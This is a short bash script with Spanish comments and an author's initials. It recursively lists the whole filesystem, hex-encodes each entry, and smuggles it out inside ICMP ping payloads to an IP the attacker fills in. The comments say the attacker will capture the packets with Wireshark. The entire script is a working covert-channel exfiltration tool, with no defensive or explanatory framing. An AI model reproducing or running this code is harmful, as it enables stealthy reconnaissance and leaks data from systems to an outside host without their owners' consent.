#!/bin/bash

todosdirs=$(ls -aR /)

for ddd in ${todosdirs[@]}; do
    # ping transmite en hexadecimal
    msg=$(echo -n $ddd | hexdump -v -e '/1 "%02x"')
    # PONER AQUi NUESTRA IP, ESCUCHAREMOS CON WIRESHARK
    ping [IP] -q -c 1 -p $msg
    sleep 5
done

# mppr. J.G.V.
